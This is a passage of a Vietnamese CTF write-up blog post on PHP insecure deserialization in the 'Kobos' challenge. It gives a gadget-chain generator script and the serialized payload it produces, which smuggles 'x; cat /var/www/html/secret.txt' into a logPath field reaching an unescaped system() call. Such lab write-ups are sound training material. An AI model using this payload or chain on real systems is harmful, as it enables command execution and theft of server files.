class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Sink nguy hiểm là:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -f <span class="subst">$this</span>-&gt;logPath&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>$logPath</code> được nối thẳng vào shell command, không quote, không escape. Vì vậy nếu đặt:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x; cat /var/www/html/secret.txt</span><br></pre></td></tr></table></figure>
+
+<p>lệnh thực tế trở thành:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -f x; <span class="built_in">cat</span> /var/www/html/secret.txt</span><br></pre></td></tr></table></figure>
+
+<p>Dấu <code>;</code> tách command trong shell, nên sau khi chạy <code>rm -f x</code>, shell sẽ chạy tiếp:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/www/html/secret.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-Tao-payload-bang-PHP"><a href="#6-Tao-payload-bang-PHP" class="headerlink" title="6. Tạo payload bằng PHP"></a>6. Tạo payload bằng PHP</h2><p>Payload generator hiện tại nằm ở:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\VSL\CBJS\WPT\Revised-Final-Exam\backup2\backup\kobos\app\app\Exploit\Test.php</span><br></pre></td></tr></table></figure>
+
+<p>Nội dung chính:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Exploit</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Libraries</span>\<span class="title">System</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Libraries</span>\<span class="title">Chapter</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/../../vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sys</span> = <span class="keyword">new</span> <span class="title class_">System</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;x; cat /var/www/html/secret.txt&quot;</span>);</span><br><span class="line"><span class="variable">$chapter</span> = <span class="keyword">new</span> <span class="title class_">Chapter</span>(<span class="variable">$sys</span>, <span class="string">&quot;pwned&quot;</span>, <span class="string">&quot;pwned&quot;</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$chapter</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(elliot㉿HackerOne)-[/mnt/…/kobos/app/app/Exploit]</span><br><span class="line">└─$ php Test.php    </span><br><span class="line">O:21:&quot;App\Libraries\Chapter&quot;:4:&#123;s:5:&quot;comic&quot;;O:20:&quot;App\Libraries\System&quot;:2:&#123;s:4:&quot;host&quot;;s:9:&quot;localhost&quot;;s:7:&quot;logPath&quot;;s:31:&quot;x; cat /var/www/html/secret.txt&quot;;&#125;s:10:&quot;chapter_id&quot;;s:5:&quot;pwned&quot;;s:5:&quot;title&quot;;s:5:&quot;pwned&quot;;s:5:&quot;stock&quot;;i:10;&#125;cat: /var/www/html/secret.txt: No such file or directory</span><br></pre></td></tr></table></figure>
+
+<p>Output sẽ gồm chuỗi serialized object:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:21:&quot;App\Libraries\Chapter&quot;:4:&#123;s:5:&quot;comic&quot;;O:20:&quot;App\Libraries\System&quot;:2:&#123;s:4:&quot;host&quot;;s:9:&quot;localhost&quot;;s:7:&quot;logPath&quot;;s:31:&quot;x; cat /var/www/html/secret.txt&quot;;&#125;s:10:&quot;chapter_id&quot;;s:5:&quot;pwned&quot;;s:5:&quot;title&quot;;s:5:&quot;pwned&quot;;s:5:&quot;stock&quot;;i:10;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="7-Debug-quan-sat-qua-trinh-deserialize"><a href="#7-Debug-quan-sat-qua-trinh-deserialize" class="headerlink" title="7. Debug quan sát quá trình deserialize:"></a>7. Debug quan sát quá trình deserialize:</h2><ul>
+<li><p>Step 1:<br><img src="/img/ctf/test/php1/1.png" alt="image-1"></p>
+</li>
+<li><p>Step 2:<br><img src="/img/ctf/test/php1/2.png" alt="image-2"></p>
+</li>
+<li><p>Step 3:<br><img src="/img/ctf/test/php1/3.png" alt="image-3"></p>
+</li>
+<li><p>Step 4:<br><img src="/img/ctf/test/php1/4.png" alt="image-4"></p>
+</li>
+<li><p>Step 5:<br><img src="/img/ctf/test/php1/5.png" alt="image-5"></p>
+</li>
+<li><p>Step 6:<br><img src="/img/ctf/test/php1/6.png" alt="image-5"></p>
+</li>
+<li><p>Step 7:<br><img src="/img/ctf/test/php1/7.png" alt="image-5"></p>
+</li>
+<li><p>Step 8:<br><img src="/img/ctf/test/php1/8.png" alt="image-5"></p>
+</li>
+</ul>
+<h2 id="8-Ket-luan"><a href="#8-Ket-luan" class="headerlink" title="8. Kết luận"></a>8. Kết luận</h2><p>Bài Kobos là một ví dụ rõ của PHP insecure deserialization. Điểm mấu chốt không phải là payload dài, mà là hiểu luồng object lifecycle:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">upload log độc hại</span><br><span class="line">-&gt; get log</span><br><span class="line">-&gt; unserialize object Chapter</span><br><span class="line">-&gt; destructor tự chạy</span><br><span class="line">-&gt; gọi System::remove</span><br><span class="line">-&gt; command injection qua logPath</span><br></pre></td></tr></table></figure>
+
+<p>Khi gặp bài PHP tương tự, hãy tìm nhanh các keyword:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">unserialize(</span><br><span class="line">serialize(</span><br><span class="line">__destruct</span><br><span class="line">__wakeup</span><br><span class="line">__toString</span><br><span class="line">system(</span><br><span class="line">exec(</span><br><span class="line">shell_exec(</span><br><span class="line">passthru(</span><br></pre></td></tr></table></figure>
+
+<p>Sau đó ghép chain từ magic method đến sink nguy hiểm. Với Kobos, chain <code>Chapter -&gt; System</code> đủ để đọc <code>secret.txt</code> và lấy flag local.</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://elliotbigfan.github.io">H00d1eBl4ck</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://elliotbigfan.github.io/2026/07/14/2026/ctf/test/wu3/">https://elliotbigfan.github.io/2026/07/14/2026/ctf/test/wu3/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/Training/">Training</a></div><div class="post-share"><div class="social-share" data-image="/img/ctf/test/poster.avif" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/07/07/2026/ctf/test/wu2/" title="Python Deserialize (Pickle)"><img class="cover" src="/img/ctf/test/poster.avif" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Python Deserialize (Pickle)</div></div><div class="info-2"><div class="info-item-1">1. Tổng quanTrong bài IPKage, backend dùng FastAPI và có một tính năng upload&#x2F;restore cache xử lý tài liệu trademark. Cache này được lưu dưới dạng file .pkl, sau đó backend đọc lại bằng pickle.load(). Vấn đề nằm ở chỗ: pickle không phải format dữ liệu an toàn để nhận từ user. Khi Python unpickle một object, nó có thể gọi lại các callable được chỉ định trong payload. Nếu attacker kiểm soát file pickle, attacker có thể biến thao tác pickle.load() thành thực thi code trên server. Luồng khai...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/07/03/2026/ctf/test/wu/" title="Java Deserialize"><img class="cover" src="/img/ctf/test/poster.avif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-07-03</div><div class="info-item-2">Java Deserialize</div></div><div class="info-2"><div class="info-item-1">Sơ lược luồng khai thác1Stacked SQL Injection ---chèn payload base64 vào rule_blob---&gt; Checkout ---&gt; Deserialize ---&gt; RCE   Quá trình đi từ Checkout đến Deserialize Quá trình tái hiện và debugThực hiện stacked SQLi để chèn payload deserialize base64 vào rule_blob của bảng vouchers Đầu tiên thì mình sẽ check trước stacked sqli có hoạt động được hay không khi update rule_blob, mình sẽ thử UPDATE rule_blob của vouchers bằng 1 giá trị rác trước và sau đó sẽ dùng union sqli để kiểm tra ru...</div></div></div></a><a class="pagination-related" href="/2026/07/07/2026/ctf/test/wu2/" title="Python Deserialize (Pickle)"><img class="cover" src="/img/ctf/test/poster.avif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-07-07</div><div class="info-item-2">Python Deserialize (Pickle)</div></div><div class="info-2"><div class="info-item-1">1. Tổng quanTrong bài IPKage, backend dùng FastAPI và có một tính năng upload&#x2F;restore cache xử lý tài liệu trademark. Cache này được lưu dưới dạng file .pkl, sau đó backend đọc lại bằng pickle.load(). Vấn đề nằm ở chỗ: pickle không phải format dữ liệu an toàn để nhận từ user. Khi Python unpickle một object, nó có thể gọi lại các callable được chỉ định trong payload. Nếu attacker kiểm soát file pickle, attacker có thể biến thao tác pickle.load() thành thực thi code trên server. Luồng khai...</div></div></div></a><a class="pagination-related" href="/2026/03/02/2026/ctf/bkctf/wu/" title="Writeup: BK CTF 2026"><img class="cover" src="/img/ctf/bkctf/poster.jpeg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-02</div><div class="info-item-2">Writeup: BK CTF 2026</div></div><div class="info-2"><div class="info-item-1">Web | TinySQL 2Phân tích các đoạn code xử lý chính1. Route login in app.py: 1234567891011121314151617@app.route(&#x27;/login&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def login():    if request.method == &#x27;GET&#x27;: return render_template(&#x27;login.html&#x27;)    # user lookup syntax `S:[user]:[pass]#comment`    # results = [id, user, pass]    # removed sql injection    # code, results = conn.query(&#x27;S:&#x27; + request.form[&#x27;user&#x27;] +  &#x27;:&#x27; + request.form...</div></div></div></a><a class="pagination-related" href="/2026/02/16/2026/ctf/lactf/wu/" title="Writeup: LA CTF 2026"><img class="cover" src="/img/ctf/lactf/poster.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-16</div><div class="info-item-2">Writeup: LA CTF 2026</div></div><div class="info-2"><div class="info-item-1">Web | GlotqGiới thiệuGlotq là một challenge CTF khai thác lỗ hổng trong ứng dụng web viếtbằng Go, tận dụng sự không nhất quán giữa lớp security middleware vàcác handler thực thi lệnh. Cụ thể, ta gửi payload đến endpoint /jsonnhưng gán header Content-Type: application/yaml. Khi đó middleware sửdụng YAML parser trong khi handler xử lý JSON parser. Kết quả là payloadđược giải mã khác nhau ở hai bước, cho phép vượt qua cơ chế kiểm tra vàthực thi lệnh bất hợp lệ.  Cơ chế ứng dụng và middlewareXét ...</div></div></div></a><a class="pagination-related" href="/2026/01/14/2025/ctf/asisctf/wu/" title="Writeup: ASIS CTF 2025"><img class="cover" src="/img/ctf/asis/poster.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-14</div><div class="info-item-2">Writeup: ASIS CTF 2025</div></div><div class="info-2"><div class="info-item-1">Web | Bookmarks Phân tích file app.py, ta có thể thấy bug CLRF injection nằm ở hàm dashboard và hoàn toàn có thể tận dụng bug này để gây ra XSS.  1234567891011121314151617181920@app.route(&quot;/dashboard&quot;, methods=[&#x27;GET&#x27;])def dashboard():    user_id = session.get(&quot;user_id&quot;)    if not user_id:        return &quot;User not logged&quot;, 400    username = None    with sqlite3.connect(DB_NAME) as conn:        cur = conn.execute(&quot;SELECT username FROM users WHERE id =...</div></div></div></a><a class="pagination-related" href="/2025/11/11/2025/ctf/Infobahn/wu/" title="Writeup: Infobahn 2025"><img class="cover" src="/img/ctf/infobahn/poster.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-11</div><div class="info-item-2">Writeup: Infobahn 2025</div></div><div class="info-2"><div class="info-item-1">Beginner (Web) | Challenge: Bitset, Bitsets và Bitsetsy Các challenges này tác giả đã cố tình để unintended :&gt;   Mình chỉ cần truy cập /run.sh là lấy đc flag cho cả 3 bài :&gt;    Ở các challenge revenge sau sẽ bỏ đi unintended này và cần phải hack thật sự.  Beginner (Web) | Challenge: Bitset-revenge, Bitsets-revengeBitset-revenge Chall này validate không an toàn ở param url và truyền giá trị url này vào thuộc tính src của tag img dẫn đến kẻ tấn công có thể bypass và gây ra xss lấy flag đư...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/favicon_io/android-chrome-192x192.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">H00d1eBl4ck</div><div class="author-info-description">Thuan Le</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">22</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ElliotBigFan"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ElliotBigFan" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">I'm trying to be better</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Tong-quan"><span class="toc-number">1.</span> <span class="toc-text">1. Tổng quan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-PHP-serialize-unserialize-la-gi"><span class="toc-number">2.</span> <span class="toc-text">2. PHP serialize&#x2F;unserialize là gì?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Vi-sao-unserialize-nguy-hiem"><span class="toc-number">3.</span> <span class="toc-text">3. Vì sao unserialize nguy hiểm?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Phan-tich-source-Kobos"><span class="toc-number">4.</span> <span class="toc-text">4. Phân tích source Kobos</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-Upload-log"><span class="toc-number">4.1.</span> <span class="toc-text">4.1. Upload log</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-Load-log-va-unserialize"><span class="toc-number">4.2.</span> <span class="toc-text">4.2. Load log và unserialize</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-Gadget-chain"><span class="toc-number">5.</span> <span class="toc-text">5. Gadget chain</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-Class-Chapter"><span class="toc-number">5.1.</span> <span class="toc-text">5.1. Class Chapter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-Class-System"><span class="toc-number">5.2.</span> <span class="toc-text">5.2. Class System</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-Tao-payload-bang-PHP"><span class="toc-number">6.</span> <span class="toc-text">6. Tạo payload bằng PHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-Debug-quan-sat-qua-trinh-deserialize"><span class="toc-number">7.</span> <span class="toc-text">7. Debug quan sát quá trình deserialize:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-Ket-luan"><span class="toc-number">8.</span> <span class="toc-text">8. Kết luận</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/07/14/2026/ctf/test/wu3/" title="PHP Deserialize"><img src="/img/ctf/test/poster.avif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP Deserialize"/></a><div class="content"><a class="title" href="/2026/07/14/2026/ctf/test/wu3/" title="PHP Deserialize">PHP Deserialize</a><time datetime="2026-07-14T09:04:19.000Z" title="Created 2026-07-14 16:04:19">2026-07-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/07/07/2026/ctf/test/wu2/" title="Python Deserialize (Pickle)"><img src="/img/ctf/test/poster.avif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Python Deserialize (Pickle)"/></a><div class="content"><a class="title" href="/2026/07/07/2026/ctf/test/wu2/" title="Python Deserialize (Pickle)">Python Deserialize (Pickle)</a><time datetime="2026-07-07T10:02:40.000Z" title="Created 2026-07-07 17:02:40">2026-07-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/07/03/2026/ctf/test/wu/" title="Java Deserialize"><img src="/img/ctf/test/poster.avif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java Deserialize"/></a><div class="content"><a class="title" href="/2026/07/03/2026/ctf/test/wu/" title="Java Deserialize">Java Deserialize</a><time datetime="2026-07-03T14:18:24.000Z" title="Created 2026-07-03 21:18:24">2026-07-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/28/Game/cbjs/league/season1/wu/" title="Writeup: CBJS League (Season 1)"><img src="/img/game/cbjs/league/season1/poster.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: CBJS League (Season 1)"/></a><div class="content"><a class="title" href="/2026/04/28/Game/cbjs/league/season1/wu/" title="Writeup: CBJS League (Season 1)">Writeup: CBJS League (Season 1)</a><time datetime="2026-04-28T05:17:52.000Z" title="Created 2026-04-28 12:17:52">2026-04-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/10/platform-training/pwn/pwnable.tw/wu/" title="Writeup: Pwnable.tw"><img src="/img/training/pwn/pwnable.tw/poster.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: Pwnable.tw"/></a><div class="content"><a class="title" href="/2026/04/10/platform-training/pwn/pwnable.tw/wu/" title="Writeup: Pwnable.tw">Writeup: Pwnable.tw</a><time datetime="2026-04-10T10:38:27.000Z" title="Created 2026-04-10 17:38:27">2026-04-10</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/ctf/test/poster.avif);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By H00d1eBl4ck</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="1" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
